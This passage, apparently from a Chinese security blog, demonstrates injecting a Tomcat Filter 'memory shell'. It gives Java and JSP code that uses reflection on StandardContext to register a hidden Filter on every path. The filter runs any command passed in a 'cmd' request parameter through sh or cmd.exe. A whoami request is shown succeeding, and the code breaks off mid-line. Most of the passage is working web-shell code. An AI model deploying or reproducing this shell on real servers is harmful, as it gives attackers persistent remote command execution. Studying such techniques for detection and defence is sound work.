+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">FilterDef</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">declaredConstructors</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">FilterDef</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">FilterDef</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (FilterDef)</span><span style="color: #E5C07B">declaredConstructors</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">o</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilter</span><span style="color: #ABB2BF">(filter);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">o</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterName</span><span style="color: #ABB2BF">(FilterName);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">o</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterClass</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">filter</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFilterDef</span><span style="color: #ABB2BF">(o);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">//反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">FilterMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">declaredConstructor</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">FilterMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">org</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">apache</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">tomcat</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">util</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">descriptor</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">web</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">FilterMap</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">o1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (FilterMap)</span><span style="color: #E5C07B">declaredConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">o1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addURLPattern</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/*&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">o1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setFilterName</span><span style="color: #ABB2BF">(FilterName);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">o1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDispatcher</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">DispatcherType</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">REQUEST</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">name</span><span style="color: #ABB2BF">());  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addFilterMapBefore</span><span style="color: #ABB2BF">(o1);  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">//反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">ApplicationFilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">declaredConstructor1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ApplicationFilterConfig</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Context</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">FilterDef</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">declaredConstructor1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ApplicationFilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">filterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (ApplicationFilterConfig) </span><span style="color: #E5C07B">declaredConstructor1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(standardContext,o);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">filterConfigs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(FilterName,filterConfig);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Success&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }  </span></span>
+<span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">) {  </span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">protected</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doGet</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">HttpServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doPost</span><span style="color: #ABB2BF">(request, response);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>访问<code>http://localhost:8080/filter_war_exploded/demoServlet</code><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406215854816.png" srcset="/img/loading.gif" lazyload alt="image-20260406215854789"></p>
+<p>访问<code>http://localhost:8080/filter_war_exploded/demoServlet ?cmd=whoami</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260406215807762.png" srcset="/img/loading.gif" lazyload alt="image-20260406215807720"></p>
+<p>注入成功</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>上传一个 .jsp 文件</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">--</span></span>
+<span class="line"><span style="color: #E06C75">  User</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> piggy</span></span>
+<span class="line"><span style="color: #E06C75">  Date</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #D19A66">2026</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">4</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">06</span></span>
+<span class="line"><span style="color: #E06C75">  Time</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> 上午10</span><span style="color: #C678DD">:</span><span style="color: #D19A66">31</span></span>
+<span class="line"><span style="color: #ABB2BF">--</span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> contentType</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;text/html;charset=UTF-8&quot;</span><span style="color: #E06C75"> language</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.core.ApplicationContext&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.lang.reflect.Field&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.core.StandardContext&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.util.Map&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.io.IOException&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.lang.reflect.Constructor&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.Context&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.io.InputStream&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.util.Scanner&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;piggy&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// 获取上下文</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ServletContext</span><span style="color: #E06C75"> servletContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getServletContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> appctx </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">servletContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">appctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ApplicationContext</span><span style="color: #E06C75"> applicationContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (ApplicationContext) </span><span style="color: #E5C07B">appctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(servletContext);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> stdctx </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">applicationContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;context&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">stdctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">StandardContext</span><span style="color: #E06C75"> standardContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (StandardContext) </span><span style="color: #E5C07B">stdctx</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(applicationContext);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> Configs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;filterConfigs&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Configs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Map</span><span style="color: #E06C75"> filterConfigs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Map) </span><span style="color: #E5C07B">Configs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(standardContext);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">filterConfigs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(name)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">){</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">Filter</span><span style="color: #E06C75"> filter </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Filter</span><span style="color: #E06C75">() {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> init</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">FilterConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterConfig</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doFilter</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletRequest</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ServletResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">servletResponse</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">FilterChain</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">filterChain</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">req</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest) servletRequest;</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">boolean</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">isLinux</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">osTyp</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getProperty</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;os.name&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (osTyp </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">osTyp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toLowerCase</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;win&quot;</span><span style="color: #ABB2BF">)) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                        isLinux </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">                    }</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">cmds</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> isLinux </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] {</span><span style="color: #98C379">&quot;sh&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;-c&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">)} </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] {</span><span style="color: #98C379">&quot;cmd.exe&quot;</span><span style="color: 